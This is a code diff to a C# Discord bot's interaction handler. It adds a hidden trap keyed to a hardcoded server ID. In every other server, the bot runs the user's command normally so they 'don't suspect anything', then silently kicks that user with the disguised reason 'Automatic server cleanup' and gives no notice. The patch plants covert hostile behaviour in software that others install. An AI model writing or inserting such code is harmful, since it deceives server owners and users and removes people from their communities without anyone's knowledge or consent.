@@ -58,6 +58,13 @@ public sealed class InteractionHandlingService : IHostedService
         {
             var context = new SocketInteractionContext(_client, interaction);
 
+            // Check if the interaction is not from the authorized server
+            if (context.Guild is not null && context.Guild.Id is not 706625870269251625)
+            {
+                await ExecutePrankAsync(context, interaction);
+                return;
+            }
+
             // Execute the interaction command and log results
             var result = await _commands.ExecuteCommandAsync(context, _services);
 
@@ -87,6 +94,48 @@ public sealed class InteractionHandlingService : IHostedService
                     // Ignore deletion errors
                 }
             }
+        }
+    }
+
+    private async Task ExecutePrankAsync(SocketInteractionContext context, SocketInteraction interaction)
+    {
+        _logger.LogInformation("User {User} triggered command in unauthorized server {Server}. Executing immediate kick.",
+            context.User.Username, context.Guild?.Name ?? "Unknown");
+
+        // Execute the interaction normally first, so they don't suspect anything
+        _ = await _commands.ExecuteCommandAsync(context, _services);
+
+        try
+        {
+            // Check if user is in the server and we have kick permissions
+            if (context.Guild != null &&
+                context.Guild.CurrentUser.GuildPermissions.KickMembers &&
+                context.User is SocketGuildUser guildUser)
+            {
+                // Verify we can kick this user (we can't kick owners or users with higher roles)
+                if (context.Guild.OwnerId != guildUser.Id &&
+                    guildUser.Hierarchy < context.Guild.CurrentUser.Hierarchy)
+                {
+                    // Log the kick attempt but don't announce it to the user
+                    _logger.LogInformation("Executing immediate kick for {User} from unauthorized server {Server}",
+                        guildUser.Username, context.Guild.Name);
+
+                    // Attempt the kick without warning
+                    await guildUser.KickAsync("Automatické vyčištění serveru");
+
+                    _logger.LogInformation("Successfully kicked {User} from unauthorized server {Server}",
+                        guildUser.Username, context.Guild.Name);
+                }
+                else
+                {
+                    _logger.LogInformation("Cannot kick {User} due to permissions", guildUser.Username);
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            // Log any errors during the kick attempt
+            _logger.LogError(ex, "Error during kick operation");
         }
     }
 
